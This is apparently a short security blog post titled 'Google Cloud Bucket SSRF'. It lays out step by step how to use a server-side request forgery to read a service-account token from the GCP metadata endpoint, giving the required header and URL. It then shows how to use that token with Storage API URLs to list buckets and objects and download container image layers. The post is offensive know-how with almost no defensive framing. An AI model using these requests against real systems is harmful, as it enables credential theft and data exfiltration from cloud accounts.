---
layout: post
title:  "Google Cloud Bucket SSRF"
date:   2020-12-03 17:56:00
tags:   [SSRF]
---

## Description
This post contains about to leak image files from google cloud buckets when you can trigger SSRF and can handle request header.
<br/>
<br/>


## Metadata API
You must use `Metadata-Flavor: Google` header to access google metadata API.
```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
<br/>
<br/>


## Google Cloud Bucket
You must access this endpoint with token that you leaked at the first step.
#### Get buckets
```
https://www.googleapis.com/storage/v1/b?project=(Project)
```

#### Get bucket's Object
```
https://www.googleapis.com/storage/v1/b/(Project)/o
```

#### Extracting Image
```
https://www.googleapis.com/download/storage/v1/b/(Project)/o/containers/images/(Hash)?generation=(Gen)&alt=media
```

#### Unarchive
When you extract one image object, you can get one piece of image in `Tar` file format.
